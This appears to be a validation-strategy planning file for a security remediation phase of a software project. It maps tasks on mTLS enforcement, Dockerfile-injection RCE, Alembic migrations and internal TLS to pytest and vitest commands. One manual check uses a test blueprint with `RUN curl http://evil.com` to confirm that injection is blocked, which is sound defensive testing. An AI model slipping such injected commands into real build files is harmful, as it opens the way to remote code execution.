---
phase: 164
slug: adversarial-audit-remediation-fix-mtls-enforcement-rce-in-foundry-migration-framework-and-fe-be-gaps
status: draft
nyquist_compliant: false
wave_0_complete: false
created: 2026-04-17
---

# Phase 164 — Validation Strategy

> Per-phase validation contract for feedback sampling during execution.

---

## Test Infrastructure

| Property | Value |
|----------|-------|
| **Framework** | pytest 7.x (backend) + vitest (frontend) |
| **Config file** | `puppeteer/pytest.ini` / `puppeteer/dashboard/vite.config.ts` |
| **Quick run command** | `cd puppeteer && pytest tests/ -x -q` |
| **Full suite command** | `cd puppeteer && pytest tests/ && cd dashboard && npm run test` |
| **Estimated runtime** | ~60 seconds |

---

## Sampling Rate

- **After every task commit:** Run `cd puppeteer && pytest tests/ -x -q`
- **After every plan wave:** Run `cd puppeteer && pytest tests/ && cd puppeteer/dashboard && npm run test`
- **Before `/gsd:verify-work`:** Full suite must be green
- **Max feedback latency:** 60 seconds

---

## Per-Task Verification Map

| Task ID | Plan | Wave | Requirement | Test Type | Automated Command | File Exists | Status |
|---------|------|------|-------------|-----------|-------------------|-------------|--------|
| 164-01-01 | 01 | 1 | SEC-01 (mTLS) | unit | `cd puppeteer && pytest tests/test_mtls.py -x -q` | ❌ W0 | ⬜ pending |
| 164-01-02 | 01 | 1 | SEC-01 (mTLS) | integration | `cd puppeteer && pytest tests/test_mtls.py -x -q` | ❌ W0 | ⬜ pending |
| 164-02-01 | 02 | 1 | SEC-02 (RCE) | unit | `cd puppeteer && pytest tests/test_foundry_security.py -x -q` | ❌ W0 | ⬜ pending |
| 164-02-02 | 02 | 1 | SEC-02 (RCE) | integration | `cd puppeteer && pytest tests/test_foundry_security.py -x -q` | ❌ W0 | ⬜ pending |
| 164-03-01 | 03 | 2 | ARCH-01 (Alembic) | unit | `cd puppeteer && pytest tests/test_migrations.py -x -q` | ❌ W0 | ⬜ pending |
| 164-03-02 | 03 | 2 | ARCH-01 (Alembic) | integration | `cd puppeteer && pytest tests/test_migrations.py -x -q` | ❌ W0 | ⬜ pending |
| 164-04-01 | 04 | 2 | SEC-04 (Internal TLS) | unit | `cd puppeteer && pytest tests/test_internal_tls.py -x -q` | ❌ W0 | ⬜ pending |
| 164-05-01 | 05 | 3 | QUAL-02 (Hardcoded keys) | unit | `cd puppeteer && pytest tests/ -x -q -k "public_key"` | ✅ | ⬜ pending |
| 164-06-01 | 06 | 3 | FEBE-01/02/03 | unit+e2e | `cd puppeteer/dashboard && npm run test` | ✅ | ⬜ pending |

*Status: ⬜ pending · ✅ green · ❌ red · ⚠️ flaky*

---

## Wave 0 Requirements

- [ ] `puppeteer/tests/test_mtls.py` — stubs for SEC-01 mTLS enforcement tests
- [ ] `puppeteer/tests/test_foundry_security.py` — stubs for SEC-02 RCE injection validation
- [ ] `puppeteer/tests/test_migrations.py` — stubs for ARCH-01 Alembic migration tests
- [ ] `puppeteer/tests/test_internal_tls.py` — stubs for SEC-04 internal TLS verification

---

## Manual-Only Verifications

| Behavior | Requirement | Why Manual | Test Instructions |
|----------|-------------|------------|-------------------|
| Node without client cert is rejected at `/work/pull` | SEC-01 | Requires live mTLS Caddy stack with test cert | Launch Docker stack, attempt pull without cert, verify 403 |
| Dockerfile injection RCE blocked end-to-end | SEC-02 | Requires live Docker build execution | Submit blueprint with `RUN curl http://evil.com`, verify build fails |
| Alembic upgrade head on fresh + existing DB | ARCH-01 | DB state migration correctness | Run on SQLite dev DB and Postgres test DB |
| Internal services use TLS with CA verification | SEC-04 | Requires live Docker network inspection | `docker exec` into container, verify TLS handshake with openssl |
| 402 modal appears on license-limited action | FEBE-01 | UI flow | Trigger 402 from API mock, verify modal renders correctly |

---

## Validation Sign-Off

- [ ] All tasks have `<automated>` verify or Wave 0 dependencies
- [ ] Sampling continuity: no 3 consecutive tasks without automated verify
- [ ] Wave 0 covers all MISSING references
- [ ] No watch-mode flags
- [ ] Feedback latency < 60s
- [ ] `nyquist_compliant: true` set in frontmatter

**Approval:** pending
